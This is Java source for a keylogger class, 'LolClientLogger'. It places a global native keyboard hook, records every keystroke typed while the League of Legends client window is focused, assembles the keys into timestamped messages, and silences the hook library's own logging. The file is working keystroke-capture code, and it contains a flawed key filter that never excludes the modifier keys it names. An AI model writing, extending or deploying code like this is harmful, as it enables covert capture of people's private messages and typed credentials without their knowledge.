package logger;

import com.sun.jna.platform.win32.User32;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.logging.Level;
import java.util.logging.Logger;

public class LolClientLogger extends KeyLogger implements NativeKeyListener {

    private static LolClientLogger ourInstance = new LolClientLogger();

    private LolClientLogger() {
        baseMessage = "From: LoL-Client || At: " + getCurrentTime() + "|| Message: ";
        super.sendKey = "Enter";
    }

    public static LolClientLogger getInstance() {
        return ourInstance;
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        if (accessWindow.getActiveWindowTitle().equals(Globals.lolClient)) {
            if(NativeKeyEvent.getKeyText(e.getKeyCode()).equals(sendKey)) {
                saveMessage();
                for (String s: log) {
                    System.out.println(s);
                }

            } else if(NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Space")) {
                message = message + " ";
            } else if(NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Backspace")) {
                if (message.length() > 0) {
                    message = message.substring(0, message.length() - 1);
                }
            } else if(!NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Alt") ||
                    !NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Tab") ||
                    !NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Ctrl")) {
                message = message + NativeKeyEvent.getKeyText(e.getKeyCode());
            }
        }
    }

    @Override
    void setDefaults() {
        baseMessage = "From: LoL-Client || At: " + getCurrentTime() + "|| Message: ";
        message = "";
    }

    @Override
    public void turnOn() {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());
            System.exit(1);
        }
        GlobalScreen.addNativeKeyListener(getInstance());
        java.util.logging.Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
    }
}
